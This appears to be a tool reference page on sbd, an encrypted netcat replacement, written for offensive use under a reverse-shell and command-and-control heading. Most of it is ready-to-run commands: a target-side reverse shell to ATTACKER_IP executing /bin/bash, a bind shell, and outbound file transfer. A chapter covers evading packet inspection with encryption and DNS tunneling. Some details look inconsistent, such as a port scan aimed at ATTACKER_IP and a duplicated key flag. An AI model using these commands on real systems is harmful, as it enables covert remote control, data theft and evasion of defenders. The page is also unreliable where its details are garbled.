---
title: "sbd - Secure Backdoor"
description: "Encrypted netcat replacement with built-in encryption for secure reverse shells"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
package: "sbd"
kali_install: "sudo apt install sbd"
---

# sbd

## Overview

sbd (Secure Backdoor) is a netcat replacement with built-in encryption. It provides the same data transfer capabilities as netcat but encrypts all traffic using AES-256 encryption with a pre-shared key. sbd is designed for covert communication channels where encryption is required but a full VPN solution is not practical.

## Chapter 1: Installation

### Kali Linux

```bash
sudo apt install sbd
```

### Verify Installation

```bash
sbd -h
```

## Chapter 2: Basic Usage

### Listen for Connections

```bash
sbd -l -p 4444 -k password
```

**Explanation**: `-l` sets listener mode, `-p` specifies the port, `-k` sets the pre-shared encryption key. sbd uses AES-256 encryption with the provided key to protect all transmitted data.

### Connect to Remote Host

```bash
sbd ATTACKER_IP 4444 -k password
```

**Explanation**: Connects to the specified host and port using the same pre-shared key for encryption. Both sides must use identical keys for successful communication.

### Reverse Shell

```bash
# Attacker
sbd -l -p 4444 -k password

# Target
sbd ATTACKER_IP 4444 -k password -e /bin/bash
```

**Explanation**: sbd connects back to the attacker and executes `/bin/bash`, providing an encrypted reverse shell. All shell traffic is encrypted using AES-256.

## Chapter 3: Encryption

### Key Generation

```bash
sbd -k "my_secret_key" -g
```

**Explanation**: Generates a random encryption key based on the provided passphrase. The generated key can be used with the `-k` flag to ensure both sides use the same encryption parameters.

### Pre-Shared Key

```bash
# Both sides must use the same key
sbd -l -p 4444 -k "S3cr3tK3y!@#$%"
sbd ATTACKER_IP 4444 -k "S3cr3tK3y!@#$%"
```

**Explanation**: The pre-shared key is used to derive the AES-256 encryption key. A strong passphrase is essential for security. The key must be identical on both the listener and the connecting side.

## Chapter 4: Data Transfer

### File Transfer

```bash
# Receiver
sbd -l -p 4444 -k password > received_file

# Sender
sbd ATTACKER_IP 4444 -k password < file_to_send
```

**Explanation**: Files are transferred through the encrypted tunnel. The data is encrypted before transmission and decrypted on receipt, protecting sensitive data during transfer.

### Encrypted Chat

```bash
# Server
sbd -l -p 4444 -k password

# Client
sbd ATTACKER_IP 4444 -k password
```

**Explanation**: Without command execution or file redirection, sbd provides an encrypted bidirectional text channel. Both sides type messages that appear on the other side's terminal.

## Chapter 5: Port Scanning

### Scan with sbd

```bash
sbd -z -v ATTACKER_IP 1-1000
```

**Explanation**: The `-z` flag enables zero-I/O mode for port scanning, and `-v` provides verbose output. sbd scans TCP ports and reports open ones.

## Chapter 6: Advanced Techniques

### Bind Shell

```bash
# Target
sbd -l -p 4444 -k password -e /bin/bash

# Attacker
sbd 192.168.1.100 4444 -k password
```

**Explanation**: sbd listens on the target for incoming connections and provides an encrypted shell. The attacker connects to the target's listening port.

### UDP Mode

```bash
sbd -u -l -p 4444 -k password
```

**Explanation**: The `-u` flag switches to UDP mode. UDP mode provides encryption over connectionless transport, though reliability depends on the application layer.

### Keep Listening

```bash
sbd -l -p 4444 -k password -k password -d
```

**Explanation**: The `-d` flag enables daemon mode, keeping sbd listening after a client disconnects. This allows multiple sequential connections without restarting.

## Chapter 7: Evasion

### Traffic Analysis Resistance

sbd's encrypted traffic appears as random data to network monitors. Unlike netcat, which transmits data in cleartext, sbd's AES-256 encryption makes deep packet inspection ineffective against detecting command content.

### DNS Evasion

Combine sbd with DNS tunneling tools to hide encrypted traffic within DNS queries, providing additional layers of evasion beyond encryption.

## Chapter 8: Operational Security

### Key Distribution

Pre-shared keys must be securely distributed to both sides before deployment. This can be done through:
- Secure file transfer
- Out-of-band communication
- Embedded in deployment scripts
- Stored in encrypted configuration files

### Key Rotation

Regularly changing the pre-shared key limits the impact of key compromise. sbd does not support automatic key rotation, so manual key changes require restarting the connection.

## Resources

- [sbd Homepage](https://www.kali.org/tools/sbd/)
- [Kali Linux sbd Package](https://packages.debian.org/sbd/)
- [AES Encryption Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
